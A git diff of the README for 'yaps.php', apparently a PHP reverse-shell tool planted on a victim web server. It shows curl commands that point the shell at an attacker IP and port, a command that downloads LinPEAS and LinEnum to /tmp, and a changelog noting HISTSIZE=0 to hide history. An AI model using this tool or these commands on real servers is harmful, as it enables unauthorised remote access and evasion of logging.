@@ -35,10 +35,12 @@ It's currently in its first version and I haven't tested it much yet, and *there
 * 2.1 Editing the variables at the start of the script;
 * 2.2 Setting them via web request (`curl -x POST -d "x=ip&y=port" victim.com/yaps.php` or `curl victim.com/yaps.php?x=ip&y=port`);
 3. Open yaps.php on browser or curl it;
-4. Hack!
+* 3.1 You can set `yaps.php?s` or `yaps.php?silent` to supress the banner
+5. Hack!
 
 ## Working commands
 * `!help - Display the help menu`
+* `!all-colors` - Toggle all colors (compatible with colorless TTY)
 * `!color - Toggle PS1 color (locally only, no environment variable is changed)`
 * `!enum - Download LinPEAS and LinEnum to /tmp and get them ready to use`
 * `!info - list informations about the target (the enumeration I mentioned above)`
@@ -61,7 +63,13 @@ It's currently in its first version and I haven't tested it much yet, and *there
 
 ## Changelog
 
-**1.0.1 - 08/07/2021**
+**v1.1 - 12/07/2021**
+- Added `!all-colors` to toggle terminal colors and work with colorless TTYs
+- Added `exit` command to close socket (leave shell)
+- Changed payload in `!stabilize` to set HISTSIZE=0
+- Changed the method of obtaining CPU and meminfo in `!info` 
+
+**v1.0.1 - 08/07/2021**
 - Changed `[x,y,z]` to `array(x,y,z)` to improve compatibility with older PHP versions
 - Changed payload for interactive shell to work with PHP<5.4
 
